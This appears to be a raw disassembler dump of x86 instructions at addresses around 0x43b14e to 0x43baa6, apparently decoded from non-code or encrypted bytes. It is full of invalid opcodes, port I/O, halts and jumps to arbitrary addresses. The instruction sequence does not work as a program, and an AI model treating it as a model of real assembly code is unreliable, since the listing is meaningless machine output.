  43b14e:	rcr    DWORD PTR [esi+0x7],cl
  43b151:	jmp    0x21c42559
  43b156:	sub    esp,DWORD PTR [edi+0x7c3c4243]
  43b15c:	ret    0x8e9c
  43b15f:	mov    ah,ch
  43b161:	push   DWORD PTR [eax-0x7b]
  43b164:	sub    edi,edx
  43b166:	jmp    0x265a748a
  43b16b:	sub    BYTE PTR [ecx+0x44],bh
  43b16e:	cdq    
  43b16f:	(bad)  
  43b170:	mov    eax,ds:0xd621da00
  43b175:	mov    WORD PTR [ebx+eax*4-0x7d8fad45],fs
  43b17c:	lahf   
  43b17d:	mov    BYTE PTR [edi+eax*4+0x7c],bh
  43b181:	je     0x43b104
  43b183:	clc    
  43b184:	adc    BYTE PTR [ecx+ebx*8],bh
  43b187:	mov    bh,0x2b
  43b189:	sub    DWORD PTR [ecx+0x248cfa65],0x50
  43b190:	mov    ebx,0xf3b56451
  43b195:	dec    edi
  43b196:	pop    esp
  43b197:	dec    ebp
  43b198:	fwait
  43b199:	out    0xd5,eax
	...
  43b1b3:	add    BYTE PTR [edi],dh
  43b1b5:	cs cli 
  43b1b7:	sar    bl,cl
  43b1b9:	stos   DWORD PTR es:[edi],eax
  43b1ba:	(bad)  
  43b1bb:	mov    dh,0x73
  43b1bd:	xor    edi,edx
  43b1bf:	xor    eax,0x1fc1f413
  43b1c4:	pop    es
  43b1c5:	aad    0xfa
  43b1c7:	adc    al,0x90
  43b1c9:	js     0x43b247
  43b1cb:	add    eax,0x8152298a
  43b1d0:	pop    ss
  43b1d1:	inc    ebp
  43b1d2:	cli    
  43b1d3:	xchg   BYTE PTR [edi],cl
  43b1d5:	mov    cl,0x67
  43b1d7:	xchg   ecx,eax
  43b1d8:	(bad)  
  43b1d9:	xchg   edi,eax
  43b1da:	cli    
  43b1db:	jbe    0x43b248
  43b1dd:	shr    BYTE PTR [ebx+0x60],0x35
  43b1e1:	retf   
  43b1e2:	mov    esp,ds
  43b1e4:	aaa    
  43b1e5:	jae    0x43b195
  43b1e7:	jmp    0x492bb6e3
  43b1ec:	cli    
  43b1ed:	das    
  43b1ee:	cli    
  43b1ef:	mov    edx,0x6f807c
  43b1f4:	mov    bl,0xef
  43b1f6:	cmc    
  43b1f7:	push   eax
  43b1f8:	daa    
  43b1f9:	add    DWORD PTR [ebp-0x1db0c283],ecx
  43b1ff:	mov    ecx,0x6af5ee1c
  43b204:	in     eax,0x7d
  43b206:	inc    ebx
  43b207:	pop    esp
  43b208:	popf   
  43b209:	pop    eax
  43b20a:	cld    
  43b20b:	mov    WORD PTR [eax+0x35e85262],es
  43b211:	shl    ch,0xff
  43b214:	bnd jae 0x43b27d
  43b217:	lea    eax,[eax]
	...
  43b231:	cwde   
  43b232:	fdivrp st(5),st
  43b234:	jne    0x43b273
  43b236:	push   esi
  43b237:	add    esi,0x50767416
  43b23d:	inc    edi
  43b23e:	sub    eax,0xdec38b51
  43b243:	mov    es,WORD PTR [ebx-0x3b86103e]
  43b249:	lea    ecx,[edi-0x79]
  43b24c:	inc    ebp
  43b24d:	cmp    DWORD PTR [edx+0x79],ecx
  43b250:	clc    
  43b251:	mov    WORD PTR [ebp+0x4],gs
  43b254:	mov    eax,0x5f9
  43b259:	xor    eax,0x92ff1482
  43b25e:	dec    esp
  43b25f:	jns    0x43b226
  43b261:	or     DWORD PTR [eax+0x544d04bc],edi
  43b267:	mov    eax,0x658b0
  43b26c:	push   esi
  43b26d:	in     eax,0xf8
  43b26f:	pop    ebp
  43b270:	inc    eax
  43b271:	dec    ebp
  43b272:	push   edi
  43b273:	cmc    
  43b274:	adc    eax,0x401711
  43b279:	xchg   esi,eax
  43b27a:	cld    
  43b27b:	mul    esp
  43b27d:	pop    esi
  43b27e:	push   es
  43b27f:	sti    
  43b280:	or     al,0x9
  43b282:	iret   
  43b283:	cmp    DWORD PTR [eax],eax
  43b285:	hlt    
  43b286:	sahf   
  43b287:	cmp    cl,BYTE PTR [ebx]
  43b289:	jg     0x43b26e
  43b28b:	jmp    0x38c315a
  43b290:	xor    ah,ah
  43b292:	pop    ebx
  43b293:	enter  0x74,0x0
	...
  43b2ab:	add    BYTE PTR [eax],al
  43b2ad:	add    BYTE PTR [ebx],al
  43b2af:	xchg   edx,eax
  43b2b0:	inc    ecx
  43b2b1:	push   esp
  43b2b2:	jg     0x43b29b
  43b2b4:	sub    ebx,0x4
  43b2b7:	pop    ds
  43b2b8:	(bad)  
  43b2b9:	inc    DWORD PTR [edi-0x6c]
  43b2bc:	outs   dx,BYTE PTR ds:[esi]
  43b2bd:	add    al,0xf4
  43b2bf:	sbb    esp,DWORD PTR [esi-0x1a3a5f9]
  43b2c5:	mov    WORD PTR [ecx+0x27],?
  43b2c8:	aaa    
  43b2c9:	cli    
  43b2ca:	ret    
  43b2cb:	adc    ecx,DWORD PTR [esi+0x1d]
  43b2ce:	mov    edx,0x44098c32
  43b2d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b2d4:	mov    edi,0x65819c07
  43b2d9:	cld    
  43b2da:	mov    ds:0xf6fffd62,eax
  43b2df:	sbb    edi,esi
  43b2e1:	test   BYTE PTR [edi+ecx*8+0x67798cdf],dh
  43b2e8:	xor    eax,0xce0c83fa
  43b2ed:	dec    edi
  43b2ee:	imul   edx,eax,0x5a73fb2f
  43b2f4:	sub    ebx,DWORD PTR [ecx-0x67]
  43b2f7:	pusha  
  43b2f8:	cmp    BYTE PTR [ebx-0x4f7f0cc],al
  43b2fe:	and    ah,BYTE PTR [edi+0x185c4f44]
  43b304:	mov    bh,dl
  43b306:	dec    ebx
  43b307:	xchg   esi,eax
  43b308:	add    DWORD PTR [edi],ebp
  43b30a:	xor    al,0xe6
  43b30c:	inc    esi
  43b30d:	mov    ebp,0x86c91bf0
	...
  43b32a:	add    BYTE PTR [eax],ah
  43b32c:	pushf  
  43b32d:	daa    
  43b32e:	aaa    
  43b32f:	cmc    
  43b330:	add    al,0xe9
  43b332:	add    esi,DWORD PTR [ebx+0x77cb1d2]
  43b338:	add    al,0xe9
  43b33a:	add    eax,ebx
  43b33c:	jge    0x43b38e
  43b33e:	lods   al,BYTE PTR ds:[esi]
  43b33f:	mov    edi,DWORD PTR [edx+0x7f7103a8]
  43b345:	sub    al,0x3a
  43b347:	(bad)  
  43b348:	sub    BYTE PTR [eax+0x7f2d3840],bl
  43b34e:	pop    ebx
  43b34f:	and    al,ah
  43b351:	adc    BYTE PTR [edx+0x72],dh
  43b354:	sub    BYTE PTR [ecx],bl
  43b356:	cmc    
  43b357:	in     eax,0xf4
  43b359:	sub    BYTE PTR [esi-0xbeefdc1],cl
  43b35f:	jg     0x43b353
  43b361:	xor    al,0x3a
  43b363:	mov    esi,0xc384a828
  43b368:	add    DWORD PTR [ebp+eax*1-0x1d],edi
  43b36c:	inc    esp
  43b36d:	mov    ds:0xd0b39afc,al
  43b372:	hlt    
  43b373:	arpl   bp,ax
  43b375:	imul   ebp,DWORD PTR [esi+0x78f81d93],0xffffff8e
  43b37c:	sub    BYTE PTR [ebp-0x62],ah
  43b37f:	xchg   DWORD PTR ds:0x27af7e74,eax
  43b385:	mov    ecx,0xaa7c2b38
  43b38a:	sub    ecx,DWORD PTR [ebx+0x73]
  43b38d:	stos   DWORD PTR es:[edi],eax
  43b38e:	cmp    BYTE PTR [eax],al
	...
  43b3a8:	ja     0x43b3ef
  43b3aa:	sbb    al,0xc0
  43b3ac:	jp     0x43b3ed
  43b3ae:	nop
  43b3af:	sbb    ecx,DWORD PTR [ebx+0x638c912a]
  43b3b5:	jle    0x43b3ca
  43b3b7:	cmp    al,0x70
  43b3b9:	das    
  43b3ba:	add    dh,al
  43b3bc:	or     ah,BYTE PTR [edi]
  43b3be:	repnz repz adc ah,BYTE PTR [edi]
  43b3c2:	call   FWORD PTR ds:0x5c07b0ed
  43b3c8:	push   0x20
  43b3ca:	out    0xbc,eax
  43b3cc:	pushf  
  43b3cd:	sub    bh,dl
  43b3cf:	gs mov bh,0xb3
  43b3d2:	sbb    edx,ebp
  43b3d4:	dec    edx
  43b3d5:	add    BYTE PTR [edi+0x7c792427],al
  43b3db:	push   ecx
  43b3dc:	iret   
  43b3dd:	fisubr DWORD PTR [esi-0x407c43c4]
  43b3e3:	mov    ebp,0x41f27ffb
  43b3e8:	ja     0x43b443
  43b3ea:	cld    
  43b3eb:	es jo  0x43b39e
  43b3ee:	not    DWORD PTR [edx]
  43b3f0:	jmp    0x1f45286e
  43b3f5:	xchg   edi,eax
  43b3f6:	lods   eax,DWORD PTR ds:[esi]
  43b3f7:	or     al,0xc
  43b3f9:	xlat   BYTE PTR ds:[ebx]
  43b3fa:	icebp  
  43b3fb:	call   0x2b03:0xffcb807a
  43b402:	gs jmp 0x9957decf
  43b408:	add    eax,0x69ffc5
	...
  43b425:	xor    al,0xfc
  43b427:	pop    edx
  43b428:	jb     0x43b404
  43b42a:	int    0x56
  43b42c:	mov    al,ds:0x34000436
  43b431:	jg     0x43b44e
  43b433:	adc    ch,0x0
  43b436:	add    DWORD PTR [eax],eax
  43b438:	jmp    0x439689e3
  43b43d:	push   esp
  43b43e:	pop    ds
  43b43f:	lahf   
  43b440:	pop    ebx
  43b441:	and    ebp,DWORD PTR [ebx]
  43b443:	cs ret 0x665f
  43b447:	jae    0x43b439
  43b449:	outs   dx,BYTE PTR ds:[esi]
  43b44a:	pop    ss
  43b44b:	out    0x67,eax
  43b44d:	cs sub eax,0xd7f682fa
  43b453:	mov    edi,0xdba4ae00
  43b458:	inc    ebx
  43b459:	dec    ebp
  43b45a:	sub    bh,BYTE PTR [ecx-0x5115ef1]
  43b460:	call   FWORD PTR ds:0x4ede1aa0
  43b466:	add    ebp,DWORD PTR [ecx+0x30ae0]
  43b46c:	pop    fs
  43b46e:	fdivp  st(2),st
  43b470:	call   FWORD PTR ds:0xd07fa98
  43b476:	add    esi,DWORD PTR [ebx+ebp*1+0x25]
  43b47a:	lahf   
  43b47b:	(bad)  
  43b47c:	(bad)  
  43b47d:	fstp   st(2)
  43b47f:	pop    edi
  43b480:	xchg   edx,eax
  43b481:	sbb    ch,dh
  43b483:	xor    ebx,eax
  43b485:	adc    DWORD PTR [ecx],0x35f7
	...
  43b49f:	add    BYTE PTR [eax],al
  43b4a1:	add    cl,bh
  43b4a3:	in     al,0x39
  43b4a5:	add    BYTE PTR [esi-0xf],dl
  43b4a8:	loop   0x43b497
  43b4aa:	retf   0xf5f0
  43b4ad:	mov    edi,DWORD PTR [ebp-0x3ccd0325]
  43b4b3:	mov    eax,ds:0x25edd9e
  43b4b8:	call   0xf62faeb7
  43b4bd:	not    BYTE PTR [eax-0x72bc27de]
  43b4c3:	and    ch,BYTE PTR [esi+0xb]
  43b4c6:	sbb    BYTE PTR [ebp-0x104505ba],ch
  43b4cc:	loop   0x43b4e4
  43b4ce:	mov    ebx,0x90f7f5ef
  43b4d3:	and    bl,al
  43b4d5:	inc    ebx
  43b4d6:	pop    ebp
  43b4d7:	add    al,BYTE PTR [ecx]
  43b4d9:	add    BYTE PTR [ebp+0x56],bl
  43b4dc:	or     DWORD PTR [ebx+0x43dbc658],ecx
  43b4e2:	dec    ebp
  43b4e3:	push   ebx
  43b4e4:	dec    ecx
  43b4e5:	push   0x3e1054f4
  43b4ea:	hlt    
  43b4eb:	jmp    0xf131:0x7d9ec62b
  43b4f2:	icebp  
  43b4f3:	cmp    edx,DWORD PTR [esi+edi*1-0xc]
  43b4f7:	fld    TBYTE PTR [edi+0x26479e4b]
  43b4fd:	cld    
  43b4fe:	test   DWORD PTR [edi+0x4b54ba31],ebx
  43b504:	mov    esi,0xff
	...
  43b51d:	add    BYTE PTR [eax],al
  43b51f:	into   
  43b520:	fisubr DWORD PTR [edx-0x73eb82f5]
  43b526:	push   edi
  43b527:	clc    
  43b528:	mov    ah,0xd6
  43b52a:	pop    es
  43b52b:	outs   dx,DWORD PTR ds:[esi]
  43b52c:	in     al,dx
  43b52d:	and    eax,0x63e626fd
  43b532:	mov    ds:0xe7fe5ac9,eax
  43b537:	mov    bh,BYTE PTR [edi+0x184efa37]
  43b53d:	es aam 0x65
  43b540:	push   cs
  43b541:	xor    dh,BYTE PTR [esi]
  43b543:	mov    bh,0x8f
  43b545:	pop    es
  43b546:	mov    esp,edi
  43b548:	aad    0xbe
  43b54a:	add    esi,ebp
  43b54c:	mov    ah,0xd6
  43b54e:	pop    es
  43b54f:	jg     0x43b57c
  43b551:	sub    ch,bh
  43b553:	out    0x2d,al
  43b555:	pop    esi
  43b556:	mov    ds:0xe803dac1,eax
  43b55b:	es push 0x188afa32
  43b561:	fcompp 
  43b563:	aaa    
  43b564:	sbb    al,0x7e
  43b566:	jae    0x43b561
  43b568:	push   ebx
  43b569:	stos   DWORD PTR es:[edi],eax
  43b56a:	xor    BYTE PTR [edx+0x66],bh
  43b56d:	sti    
  43b56e:	pop    esp
  43b56f:	cld    
  43b570:	out    0xde,eax
  43b572:	xchg   BYTE PTR [ecx],ah
  43b574:	adc    BYTE PTR [edx+0x3e],0xf4
  43b578:	add    al,0x91
  43b57a:	push   cs
  43b57b:	ret    
  43b57c:	es cdq 
  43b57e:	arpl   WORD PTR [edi+0x42547],dx
	...
  43b59c:	jae    0x43b5d2
  43b59e:	int    0x40
  43b5a0:	(bad)  
  43b5a1:	stc    
  43b5a2:	nop
  43b5a3:	cwde   
  43b5a4:	pushf  
  43b5a5:	es jns 0x43b576
  43b5a8:	sbb    esp,DWORD PTR [eax+0x57]
  43b5ab:	xor    eax,0xd90ac52e
  43b5b0:	sub    al,0x42
  43b5b2:	in     al,dx
  43b5b3:	add    eax,ecx
  43b5b5:	jns    0x43b603
  43b5b7:	sbb    DWORD PTR [edi],0xfffffff8
  43b5ba:	out    0x3,al
  43b5bc:	hlt    
  43b5bd:	ja     0x43b562
  43b5bf:	or     esp,DWORD PTR [ebp+eiz*1-0x40c9f445]
  43b5c6:	cmp    DWORD PTR [edi+ebp*8],eax
  43b5c9:	cli    
  43b5ca:	push   0x64053414
  43b5cf:	inc    esp
  43b5d0:	scas   al,BYTE PTR es:[di]
  43b5d2:	mov    ch,0xcc
  43b5d4:	ficomp WORD PTR [edx+0x5f778f0]
  43b5da:	jmp    0x5a3111e2
  43b5df:	(bad)
  43b5e3:	xor    BYTE PTR [eax+0x572bf924],bh
  43b5e9:	test   ecx,esi
  43b5eb:	xor    al,0x4c
  43b5ed:	mov    esi,0xe31d4463
  43b5f2:	push   eax
  43b5f3:	outs   dx,BYTE PTR fs:[esi]
  43b5f5:	(bad)
  43b5f8:	mov    dh,0xb5
  43b5fa:	nop
  43b5fb:	add    esp,esi
  43b5fd:	add    al,0x69
  43b5ff:	sub    eax,DWORD PTR [eax]
	...
  43b619:	stos   BYTE PTR es:[edi],al
  43b61a:	inc    edi
  43b61b:	ret    0x7034
  43b61e:	inc    ebp
  43b61f:	xor    al,0xec
  43b621:	repnz sbb al,0xff
  43b624:	mov    ch,0x9b
  43b626:	add    eax,DWORD PTR [edi+0x141f47a6]
  43b62c:	or     DWORD PTR ds:0x939ffc5,eax
  43b632:	cdq    
  43b633:	or     esp,DWORD PTR [edx+0x8]
  43b636:	aam    0xfa
  43b638:	hlt    
  43b639:	push   edi
  43b63a:	cmc    
  43b63b:	aas    
  43b63c:	jmp    0x7e8a4770
  43b641:	sub    al,0x4c
  43b643:	adc    eax,0x8763e1a9
  43b648:	and    al,0xe9
  43b64a:	push   ds
  43b64b:	je     0x43b63e
  43b64d:	loopne 0x43b647
  43b64f:	xchg   ebx,edi
  43b651:	aaa    
  43b652:	and    al,0x59
  43b654:	mov    dl,0x7d
  43b656:	leave  
  43b657:	cli    
  43b658:	and    BYTE PTR [ebp+0x6c9c000b],dh
  43b65e:	xor    BYTE PTR [esi+0x45],bh
  43b661:	das    
  43b662:	stos   BYTE PTR es:[edi],al
  43b663:	dec    BYTE PTR [edi+0x2ef26c1f]
  43b669:	sub    BYTE PTR [eax-0x54f86241],cl
  43b66f:	call   DWORD PTR [eax]
  43b671:	aam    0x1d
  43b673:	cli    
  43b674:	push   ss
  43b675:	pop    ds
  43b676:	mov    ebx,DWORD PTR [eax+0x74080e]
  43b67c:	adc    al,BYTE PTR [eax]
	...
  43b696:	cmc    
  43b697:	repnz mov edi,0xbec11272
  43b69d:	add    DWORD PTR [edi+ebx*1-0x6],eax
  43b6a1:	out    dx,al
  43b6a2:	and    ah,BYTE PTR [ebx+esi*2+0xf]
  43b6a6:	jp     0x43b6cb
  43b6a8:	stc    
  43b6a9:	hlt    
  43b6aa:	stos   DWORD PTR es:[edi],eax
  43b6ab:	adc    DWORD PTR [eax-0x17],eax
  43b6ae:	sbb    cl,dl
  43b6b0:	push   ebp
  43b6b1:	jmp    0x7c5dad
  43b6b6:	test   DWORD PTR [esi+ecx*1-0x75],ebx
  43b6ba:	and    eax,0x5c3c7f15
  43b6bf:	aaa    
  43b6c0:	inc    ebx
  43b6c1:	add    BYTE PTR [ebp+0x5c],cl
  43b6c4:	add    cl,BYTE PTR [ebx+0x3280a21]
  43b6ca:	test   edi,edx
  43b6cc:	fbstp  TBYTE PTR [ebx]
  43b6ce:	popf   
  43b6cf:	retf   
  43b6d0:	loop   0x43b673
  43b6d2:	jb     0x43b6ab
  43b6d4:	cmc    
  43b6d5:	xor    ecx,DWORD PTR [ebp+0x8fffeca]
  43b6db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b6dc:	out    0x83,al
  43b6de:	jno    0x43b660
  43b6e0:	dec    ecx
  43b6e1:	push   esi
  43b6e2:	pop    edi
  43b6e3:	rol    BYTE PTR ds:0xfc82beb6,cl
  43b6e9:	mov    WORD PTR [eax-0x71],ds
  43b6ec:	dec    edx
  43b6ed:	(bad)  
  43b6ee:	jmp    0x4dd37590
  43b6f3:	pop    es
  43b6f4:	div    DWORD PTR [esi]
  43b6f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b6f7:	adc    eax,0xfff7
	...
  43b710:	add    BYTE PTR [eax],al
  43b712:	add    BYTE PTR [edx],dh
  43b714:	test   BYTE PTR [ebx-0x68],al
  43b717:	(bad)  
  43b718:	dec    bh
  43b71a:	lods   al,BYTE PTR ds:[esi]
  43b71b:	adc    dh,dl
  43b71d:	jle    0x43b6df
  43b71f:	js     0x43b74e
  43b721:	add    DWORD PTR fs:[eax+0x4c],esp
  43b725:	xchg   edx,eax
  43b726:	push   eax
  43b727:	loop   0x43b747
  43b729:	loop   0x43b74e
  43b72b:	in     al,0xd5
  43b72d:	cmc    
  43b72e:	lea    ecx,[eax-0x1517b572]
  43b734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b735:	sti    
  43b736:	call   FWORD PTR [ecx]
  43b738:	leave  
  43b739:	jae    0x43b746
  43b73b:	xchg   ebx,eax
  43b73c:	retf   
  43b73d:	jp     0x43b73a
  43b73f:	mov    BYTE PTR [eax-0x4f],bl
  43b742:	pop    esi
  43b743:	ss loopne 0x43b6ff
  43b746:	mov    al,0xf4
  43b748:	sub    al,0x19
  43b74a:	imul   DWORD PTR [ecx]
  43b74c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b74d:	sbb    bh,BYTE PTR [esi-0x70]
  43b750:	inc    esp
  43b751:	sub    ebx,0x18
  43b754:	pop    ss
  43b755:	(bad)  
  43b756:	inc    edi
  43b758:	add    edi,edx
  43b75a:	cli    
  43b75b:	sub    eax,esi
  43b75d:	dec    ebp
  43b75e:	ds hlt 
  43b760:	cwde   
  43b761:	mov    dl,0x23
  43b763:	lock imul eax,edx,0x162be723
  43b76a:	adc    al,0x52
  43b76c:	xchg   ebx,eax
  43b76d:	sub    eax,0xe0203483
  43b772:	xchg   BYTE PTR [eax+0xfb0a47],bh
	...
  43b790:	mov    al,ds:0xa88d064f
  43b795:	inc    edi
  43b796:	adc    cl,BYTE PTR [ecx-0x17e7f050]
  43b79c:	out    0xbf,eax
  43b79e:	sub    eax,0x7bb47ffa
  43b7a3:	jnp    0x43b77d
  43b7a5:	pop    ss
  43b7a6:	xchg   edx,edi
  43b7a8:	sub    DWORD PTR [edi],0x3c1843e3
  43b7ae:	jg     0x43b7f3
  43b7b0:	adc    BYTE PTR [esi+edx*1],dh
  43b7b3:	adc    dl,0xf2
  43b7b6:	sub    eax,0xaa96f0e6
  43b7bb:	and    ebp,eax
  43b7bd:	lods   al,BYTE PTR ds:[esi]
  43b7be:	stos   BYTE PTR es:[edi],al
  43b7bf:	and    esp,esp
  43b7c1:	or     DWORD PTR [eax+eax*1],eax
  43b7c4:	hlt    
  43b7c5:	inc    edx
  43b7c6:	xchg   DWORD PTR [edx],esp
  43b7c8:	cmc    
  43b7c9:	sub    edi,esi
  43b7cb:	push   edx
  43b7cc:	pushf  
  43b7cd:	mov    esi,0xafabfc4e
  43b7d2:	or     bh,BYTE PTR ds:[eax-0x40]
  43b7d6:	add    al,0x0
  43b7d8:	hlt    
  43b7d9:	add    al,0x4f
  43b7db:	add    eax,DWORD PTR [ecx+0x3ba804c8]
  43b7e1:	lods   eax,DWORD PTR ds:[esi]
  43b7e2:	sbb    BYTE PTR [ebx],dl
  43b7e4:	fs fadd st(0),st
  43b7e7:	add    DWORD PTR [ebx-0x48803edf],0xffffffe8
  43b7ee:	dec    eax
  43b7ef:	aam    0xd1
  43b7f1:	add    eax,DWORD PTR [ecx-0x34]
	...
  43b80c:	add    BYTE PTR ds:0x30e8c5,bh
  43b812:	in     eax,0xf5
  43b814:	ret    
  43b815:	push   ebx
  43b816:	mov    ds,WORD PTR [eax+0x6d114587]
  43b81c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b81d:	inc    ecx
  43b81e:	and    eax,ebp
  43b820:	xor    al,ah
  43b822:	adc    dh,dl
  43b824:	ret    
  43b825:	xor    ecx,DWORD PTR [esi-0x3b04f825]
  43b82b:	call   0xe9481f1e
  43b830:	add    esp,DWORD PTR [ecx+0x4230bb07]
  43b836:	aad    0x52
  43b838:	xchg   DWORD PTR ds:0x1c46d11,eax
  43b83e:	and    eax,ebp
  43b840:	sbb    ecx,DWORD PTR [eax+0x46]
  43b843:	inc    ebx
  43b844:	xor    DWORD PTR [ebx+0x6b08b4e5],ebx
  43b84a:	adc    cl,BYTE PTR [ecx]
  43b84c:	push   edx
  43b84d:	and    al,BYTE PTR ds:0xe9777ed9
  43b853:	xor    al,0x4
  43b855:	hlt    
  43b856:	add    al,0xb9
  43b858:	sbb    esi,DWORD PTR [ebp+0x77311343]
  43b85e:	inc    ebp
  43b85f:	xchg   ebx,eax
  43b860:	mov    ebx,0x3cc6168
  43b865:	mov    bl,0x20
  43b867:	call   0xff5f9687
  43b86c:	cmc    
  43b86d:	in     al,0xa5
  43b86f:	jle    0x43b89e
	...
  43b889:	add    BYTE PTR [esi+eax*8+0x4f7e902],cl
  43b890:	je     0x43b899
  43b892:	push   0xfffffff9
  43b894:	mov    WORD PTR [ebp-0x65],?
  43b897:	retf   0xe902
  43b89a:	not    DWORD PTR [ecx+0x28600d4b]
  43b8a0:	mov    ah,0x16
  43b8a2:	and    eax,0x4c2d8c1b
  43b8a7:	aam    0x4f
  43b8a9:	scas   al,BYTE PTR es:[edi]
  43b8aa:	add    ah,BYTE PTR ds:0x91f8290d
  43b8b0:	dec    ebx
  43b8b1:	lds    eax,FWORD PTR [ebx+0x1f]
  43b8b4:	mov    edx,0x6603e138
  43b8b9:	jmp    0xeba918fe
  43b8be:	cvtps2pi mm7,QWORD PTR [edx-0x5ad81b84]
  43b8c5:	jle    0x43b8ac
  43b8c7:	sbb    dh,cl
  43b8c9:	in     al,0x17
  43b8cb:	ds ds jmp 0xd15051b9
  43b8d2:	test   DWORD PTR [eax+eax*1],0xfaf46169
  43b8d9:	hlt    
  43b8da:	aaa    
  43b8db:	hlt    
  43b8dc:	aas    
  43b8dd:	jmp    0xa5d0bd73
  43b8e2:	shl    DWORD PTR [ebx-0x311b3eb1],cl
  43b8e8:	ds add edi,eax
  43b8eb:	outs   dx,DWORD PTR ds:[esi]
  43b8ec:	repnz add BYTE PTR es:[eax],al
	...
  43b904:	add    BYTE PTR [eax],al
  43b906:	add    BYTE PTR [ecx+edx*4],al
  43b909:	inc    ebx
  43b90a:	lds    edx,FWORD PTR [edi+0x61e965cf]
  43b910:	and    ecx,edi
  43b912:	hlt    
  43b913:	adc    esi,ebp
  43b915:	aas    
  43b916:	add    BYTE PTR [ebp-0x557a0d60],bl
  43b91c:	push   esi
  43b91d:	add    al,0x57
  43b91f:	stos   BYTE PTR es:[edi],al
  43b920:	stc    
  43b921:	scas   eax,DWORD PTR es:[edi]
  43b922:	adc    cl,BYTE PTR [ebp+0x3]
  43b925:	dec    edi
  43b926:	dec    DWORD PTR [esi+0x7a]
  43b929:	jmp    edi
  43b92b:	xchg   ecx,eax
  43b92c:	out    dx,eax
  43b92d:	cmc    
  43b92e:	inc    ebx
  43b930:	(bad)  
  43b931:	ds and al,0x7e
  43b934:	or     bh,dh
  43b936:	shl    esi,cl
  43b938:	push   esp
  43b939:	push   ds
  43b93a:	adc    al,0x44
  43b93c:	pop    esp
  43b93d:	(bad)  
  43b93e:	dec    DWORD PTR [ebp-0x7e]
  43b941:	jbe    0x43b967
  43b943:	cmp    eax,0xe48506f3
  43b948:	or     DWORD PTR [eax],eax
  43b94a:	add    bh,ah
  43b94c:	add    ch,BYTE PTR [eax+0x7b]
  43b94f:	and    DWORD PTR [eax-0x28521783],esp
  43b955:	cmc    
  43b956:	jmp    DWORD PTR [esp+ecx*2-0x376fefe2]
  43b95d:	add    eax,0x9cd84
  43b962:	add    BYTE PTR [eax+0x1e001e8c],bh
  43b968:	add    eax,DWORD PTR [eax]
  43b96a:	push   eax
	...
  43b983:	add    bh,ch
  43b985:	retf   
  43b986:	loop   0x43b9c4
  43b988:	(bad)  
  43b989:	aad    0xf5
  43b98b:	test   ch,cl
  43b98d:	pop    esp
  43b98e:	cld    
  43b98f:	std    
  43b990:	push   ds
  43b991:	test   al,0x1e
  43b993:	ficomp WORD PTR [esi+0x2a166202]
  43b999:	sbb    ebp,esi
  43b99b:	adc    eax,0x3ff289
  43b9a0:	pop    esi
  43b9a1:	icebp  
  43b9a2:	push   DWORD PTR [ebx+ebx*8-0x6]
  43b9a6:	loopne 0x43b977
  43b9a8:	hlt    
  43b9a9:	clc    
  43b9aa:	sub    al,BYTE PTR [edi-0x1706b7d0]
  43b9b0:	hlt    
  43b9b1:	sub    al,0xfe
  43b9b3:	push   DWORD PTR [ebx+eax*1+0x5]
  43b9b7:	jne    0x43b98a
  43b9b9:	push   ss
  43b9ba:	icebp  
  43b9bb:	xchg   cl,bh
  43b9bd:	push   edi
  43b9be:	dec    esp
  43b9bf:	ds hlt 
  43b9c1:	es mov cl,0x3
  43b9c4:	sbb    al,0x35
  43b9c6:	cmp    al,0x3f
  43b9c8:	hlt    
  43b9c9:	inc    ebx
  43b9ca:	pusha  
  43b9cb:	test   al,0x79
  43b9cd:	dec    edi
  43b9ce:	sub    DWORD PTR [esp+edi*8-0x68],esi
  43b9d2:	xchg   edx,eax
  43b9d3:	and    ebp,DWORD PTR [eax+0x2c]
  43b9d6:	(bad)  
  43b9d7:	push   DWORD PTR [ecx-0x58]
  43b9da:	loop   0x43b9df
  43b9dc:	imul   DWORD PTR [ebx]
  43b9de:	(bad)  
  43b9df:	out    0x22,eax
  43b9e1:	dec    eax
  43b9e2:	das    
  43b9e3:	cli    
  43b9e4:	pop    edi
  43b9e5:	dec    esi
  43b9e6:	push   ss
  43b9e7:	test   DWORD PTR [eax],eax
	...
  43ba01:	inc    ecx
  43ba02:	ja     0x43ba2d
  43ba04:	xor    DWORD PTR [edi+edi*1],0xffffff87
  43ba08:	shl    ah,0x2b
  43ba0b:	(bad)  
  43ba0c:	cli    
  43ba0d:	jecxz  0x43b9a1
  43ba0f:	sysenter 
  43ba11:	inc    edx
  43ba12:	jmp    0x43ba17
  43ba14:	sti    
  43ba15:	mov    ds:0x3461963f,eax
  43ba1a:	ins    BYTE PTR es:[edi],dx
  43ba1b:	(bad)  
  43ba1c:	out    0x9c,eax
  43ba1e:	je     0x43ba4f
  43ba20:	cli    
  43ba21:	jno    0x43b9cb
  43ba23:	loop   0x43ba1c
  43ba25:	hlt    
  43ba26:	sub    edi,esi
  43ba28:	out    0x6f,eax
  43ba2a:	fldcw  WORD PTR [edi]
  43ba2c:	cli    
  43ba2d:	jl     0x43ba96
  43ba2f:	loop   0x43ba3b
  43ba31:	and    BYTE PTR ds:0x2b8084f9,ch
  43ba37:	(bad)  
  43ba38:	inc    DWORD PTR [ecx+0x17e7ad04]
  43ba3e:	mov    ch,0xd5
  43ba40:	dec    edx
  43ba41:	xor    ch,BYTE PTR [ebp+0x4fa4d68]
  43ba47:	mov    dh,0x80
  43ba49:	ja     0x43ba33
  43ba4b:	lock add al,0xf4
  43ba4e:	add    al,0x99
  43ba50:	sbb    esi,DWORD PTR [ebx]
  43ba52:	call   0x44b3e848
  43ba57:	fstp   DWORD PTR [eax-0x140e16c9]
  43ba5d:	das    
  43ba5e:	jmp    0xab53724c
  43ba63:	out    0x7e,eax
	...
  43ba7d:	add    BYTE PTR [edi],dh
  43ba7f:	jmp    0xde1f8ec8
  43ba84:	adc    eax,0x3e2d11c1
  43ba89:	ss pop esi
  43ba8b:	sbb    eax,0xa517c863
  43ba90:	sbb    cl,dl
  43ba92:	fld    DWORD PTR [ebx]
  43ba94:	adc    esp,ecx
  43ba96:	sub    eax,0xe82ce8c1
  43ba9b:	fdiv   st,st(7)
  43ba9d:	ret    
  43ba9e:	cmp    ecx,DWORD PTR [edx-0x742817ec]
  43baa4:	sub    al,0xe8
  43baa6:	add    ecx,DWORD PTR [esp+esi*8+0x71aaffe7]
